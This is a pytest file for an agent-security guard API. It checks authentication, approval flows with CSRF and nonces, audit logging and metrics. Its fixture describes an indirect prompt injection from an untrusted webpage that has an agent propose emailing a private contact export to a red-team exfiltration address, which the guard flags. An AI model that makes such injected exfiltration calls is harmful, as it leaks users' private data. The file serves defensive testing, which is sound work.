from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from agentguard_core import AuditEvent
from guard_api.auth import ApiAuthError, CapabilityAuthService
from guard_api.main import create_app
from guard_api.settings import GuardApiSettings
from guard_api.storage.memory import MemoryControlPlaneStore


class FailingHealthStore(MemoryControlPlaneStore):
    def health_check(self) -> bool:
        return False


class TrackingInitializeStore(MemoryControlPlaneStore):
    def __init__(self) -> None:
        super().__init__()
        self.initialize_count = 0

    def initialize(self) -> None:
        self.initialize_count += 1


class FailingInitializeStore(MemoryControlPlaneStore):
    def initialize(self) -> None:
        raise RuntimeError("control plane initialize failed")


def _guard_event_payload() -> dict:
    return {
        "schema_version": "0.3",
        "event_id": "evt_test",
        "event_type": "tool_call_proposed",
        "runtime": "langgraph",
        "trace_id": "trace_api",
        "case_id": "PI-API",
        "attack_type": "indirect_prompt_injection",
        "is_malicious": True,
        "timestamp": "2026-06-11T00:00:00+00:00",
        "pre_execution": True,
        "security_context": {
            "user_task": "Complete the visible web form only",
            "source_type": "webpage",
            "source_trust": "untrusted",
        },
        "payload": {
            "tool": {
                "name": "send_email",
                "category": "message",
                "kind": "email_send",
                "call_id": "call_api",
            },
            "arguments": {
                "to": "exfiltration-intake@red-team.agentguard.local",
                "subject": "contact export",
                "body": "private contact export",
            },
            "derived_resources": [],
        },
        "metadata": {},
    }


def test_guard_evaluate_requires_adapter_token() -> None:
    app = create_app(store=MemoryControlPlaneStore(), settings=GuardApiSettings(adapter_token="adapter-secret"))
    client = TestClient(app)

    response = client.post("/v1/guard/evaluate", json=_guard_event_payload())

    assert response.status_code == 401
    assert response.json()["error"]["code"] == "AUTH_MISSING"


def test_old_evaluate_and_single_audit_routes_are_not_registered() -> None:
    app = create_app(store=MemoryControlPlaneStore(), settings=GuardApiSettings(adapter_token="adapter-secret"))
    client = TestClient(app)

    evaluate_response = client.post(
        "/v1/evaluate" + "/tool-call",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_guard_event_payload(),
    )
    audit_response = client.post(
        "/v1/audit" + "/event",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_audit_event_payload(audit_id="audit_old", trace_id="trace_old", decision="allow", runtime="langgraph"),
    )

    assert evaluate_response.status_code == 404
    assert audit_response.status_code == 404


def test_health_is_lightweight_by_default() -> None:
    app = create_app(store=FailingHealthStore())
    client = TestClient(app)

    response = client.get("/health")

    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_health_can_check_database_status() -> None:
    success_client = TestClient(create_app(store=MemoryControlPlaneStore()))
    failure_client = TestClient(create_app(store=FailingHealthStore()))

    success_response = success_client.get("/health?check_db=true")
    failure_response = failure_client.get("/health?check_db=true")

    assert success_response.status_code == 200
    assert success_response.json() == {"status": "ok", "database": "ok"}
    assert failure_response.status_code == 503
    assert failure_response.json() == {"status": "degraded", "database": "error"}


def test_auth_state_survives_new_auth_service_instance() -> None:
    settings = GuardApiSettings(control_token="control-secret")
    store = MemoryControlPlaneStore()
    first_auth = CapabilityAuthService(settings=settings, store=store)

    launch_code = first_auth.create_launch_code()
    second_auth = CapabilityAuthService(settings=settings, store=store)
    session = second_auth.exchange_launch_code(launch_code)
    third_auth = CapabilityAuthService(settings=settings, store=store)

    restored = third_auth.verify_browser_session(session.session_id)
    nonce = third_auth.issue_approval_nonce(
        approval_id="app_cross_instance",
        session_id=session.session_id,
        tool_call_id="call_cross_instance",
    )
    fourth_auth = CapabilityAuthService(settings=settings, store=store)
    fourth_auth.consume_approval_nonce(
        nonce=nonce,
        approval_id="app_cross_instance",
        session_id=session.session_id,
        tool_call_id="call_cross_instance",
    )

    assert restored.session_id == session.session_id
    assert restored.csrf_token == session.csrf_token
    with pytest.raises(ApiAuthError) as reused_launch:
        second_auth.exchange_launch_code(launch_code)
    assert reused_launch.value.code == "LAUNCH_CODE_INVALID"
    with pytest.raises(ApiAuthError) as reused_nonce:
        third_auth.consume_approval_nonce(
            nonce=nonce,
            approval_id="app_cross_instance",
            session_id=session.session_id,
            tool_call_id="call_cross_instance",
        )
    assert reused_nonce.value.code == "APPROVAL_NONCE_INVALID"


def test_startup_initializes_control_plane_store() -> None:
    store = TrackingInitializeStore()
    app = create_app(store=store, settings=GuardApiSettings(environment="development"))

    assert store.initialize_count == 0
    with TestClient(app) as client:
        assert store.initialize_count == 1
        response = client.get("/health")

    assert response.status_code == 200


def test_startup_fails_when_control_plane_initialize_fails() -> None:
    app = create_app(store=FailingInitializeStore(), settings=GuardApiSettings(environment="development"))

    with pytest.raises(RuntimeError, match="control plane initialize failed"):
        with TestClient(app):
            pass


def test_ask_approval_resolve_and_wait_flow() -> None:
    settings = GuardApiSettings(adapter_token="adapter-secret", control_token="control-secret")
    app = create_app(store=MemoryControlPlaneStore(), settings=settings)
    client = TestClient(app)

    decision_response = client.post(
        "/v1/guard/evaluate",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_guard_event_payload(),
    )
    assert decision_response.status_code == 200
    evaluation = decision_response.json()
    assert evaluation["decision"]["decision"] == "ask"
    approval_id = evaluation["approval"]["approval_id"]

    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer control-secret"},
    )
    launch_code = launch_response.json()["launch_code"]
    exchange_response = client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})
    csrf_token = exchange_response.json()["csrf_token"]

    pending_response = client.get("/v1/approvals/pending")
    assert pending_response.status_code == 200
    pending = pending_response.json()
    assert pending[0]["approval_id"] == approval_id
    approval_nonce = pending[0]["approval_nonce"]

    rejected_response = client.post(
        f"/v1/approvals/{approval_id}/resolve",
        json={"decision": "allow_once", "approval_nonce": approval_nonce},
    )
    assert rejected_response.status_code == 403
    assert rejected_response.json()["error"]["code"] == "CSRF_INVALID"

    resolve_response = client.post(
        f"/v1/approvals/{approval_id}/resolve",
        headers={"X-AgentGuard-CSRF": csrf_token},
        json={"decision": "allow_once", "approval_nonce": approval_nonce},
    )
    assert resolve_response.status_code == 200
    assert resolve_response.json()["status"] == "resolved"
    assert resolve_response.json()["decision"] == "allow_once"

    wait_response = client.get(
        f"/v1/approvals/{approval_id}/wait",
        headers={"Authorization": "Bearer adapter-secret"},
    )
    assert wait_response.status_code == 200
    assert wait_response.json()["decision"] == "allow_once"


def test_guard_evaluate_writes_dashboard_audit_and_metrics() -> None:
    settings = GuardApiSettings(adapter_token="adapter-secret", control_token="control-secret")
    app = create_app(store=MemoryControlPlaneStore(), settings=settings)
    client = TestClient(app)

    decision_response = client.post(
        "/v1/guard/evaluate",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_guard_event_payload(),
    )
    assert decision_response.status_code == 200
    _login_dashboard(client, control_token="control-secret")

    events_response = client.get("/v1/audit/events")
    metrics_response = client.get("/v1/metrics/eval")

    assert events_response.status_code == 200
    event = events_response.json()[0]
    assert event["trace_id"] == "trace_api"
    assert event["case_id"] == "PI-API"
    assert event["decision"] == "ask"
    assert event["blocked"] is True
    assert event["attack_type"] == "indirect_prompt_injection"
    assert event["is_malicious"] is True
    assert event["resource_targets"] == ["exfiltration-intake@red-team.agentguard.local"]
    assert event["rule_hits"] == ["P005_external_send", "P004_task_mismatch"]
    assert event["links"]["event_id"] == "evt_test"
    assert "approval_id" in event["links"]
    assert event["latency_ms"] is not None
    assert metrics_response.status_code == 200
    assert metrics_response.json()["event_count"] == 1
    assert metrics_response.json()["ask_count"] == 1


def test_audit_events_plural_write_and_filter_for_dashboard() -> None:
    app = create_app(store=MemoryControlPlaneStore(), settings=GuardApiSettings(adapter_token="adapter-secret"))
    client = TestClient(app)
    for audit_event in [
        _audit_event_payload(audit_id="audit_keep", trace_id="trace_keep", decision="deny", runtime="langgraph"),
        _audit_event_payload(audit_id="audit_skip", trace_id="trace_skip", decision="allow", runtime="langgraph"),
    ]:
        write_response = client.post(
            "/v1/audit/events",
            headers={"Authorization": "Bearer adapter-secret"},
            json=audit_event,
        )
        assert write_response.status_code == 200
    _login_dashboard(client)

    events_response = client.get("/v1/audit/events?trace_id=trace_keep&decision=deny&limit=5")

    assert events_response.status_code == 200
    events = events_response.json()
    assert [event["audit_id"] for event in events] == ["audit_keep"]


def test_metrics_can_be_filtered_for_dashboard() -> None:
    store = MemoryControlPlaneStore()
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_allow",
            trace_id="trace_metric",
            decision="allow",
            runtime="langgraph",
            blocked=False,
            is_malicious=False,
            latency_ms=10,
        )
    )
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_deny",
            trace_id="trace_metric",
            decision="deny",
            runtime="langgraph",
            blocked=True,
            is_malicious=True,
            latency_ms=30,
        )
    )
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_other",
            trace_id="trace_other",
            decision="ask",
            runtime="openclaw",
            blocked=True,
            is_malicious=False,
            latency_ms=50,
        )
    )
    app = create_app(store=store, settings=GuardApiSettings())
    client = TestClient(app)
    _login_dashboard(client)

    metrics_response = client.get("/v1/metrics/eval?runtime=langgraph")

    assert metrics_response.status_code == 200
    metrics = metrics_response.json()
    assert metrics["event_count"] == 2
    assert metrics["allow_count"] == 1
    assert metrics["deny_count"] == 1
    assert metrics["ask_count"] == 0
    assert metrics["blocked_count"] == 1
    assert metrics["block_rate"] == 0.5
    assert metrics["fpr"] == 0.0
    assert metrics["fnr"] == 0.0
    assert metrics["average_latency_ms"] == 20.0


def _login_dashboard(client: TestClient, *, control_token: str = "demo-control-token") -> None:
    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": f"Bearer {control_token}"},
    )
    assert launch_response.status_code == 200
    launch_code = launch_response.json()["launch_code"]
    exchange_response = client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})
    assert exchange_response.status_code == 200


def _audit_event_payload(
    *,
    audit_id: str,
    trace_id: str,
    decision: str,
    runtime: str,
    blocked: bool | None = None,
    is_malicious: bool | None = None,
    latency_ms: int | None = 1,
) -> dict:
    blocked = decision in {"deny", "ask"} if blocked is None else blocked
    return {
        "audit_id": audit_id,
        "schema_version": "0.3",
        "trace_id": trace_id,
        "case_id": "case_api_filter",
        "runtime": runtime,
        "timestamp": "2026-06-11T00:00:00+00:00",
        "stage": "before_tool_call",
        "event_type": "tool_call_proposed",
        "summary": f"Audit {audit_id}",
        "decision": decision,
        "risk_score": 90 if blocked else 0,
        "severity": "critical" if blocked else "low",
        "blocked": blocked,
        "resource_targets": [],
        "rule_hits": [],
        "reason": "test audit event",
        "links": {},
        "metadata": {},
        "attack_type": "test",
        "is_malicious": is_malicious,
        "latency_ms": latency_ms,
    }


def _audit_event_model(**kwargs):
    return AuditEvent.model_validate(_audit_event_payload(**kwargs))
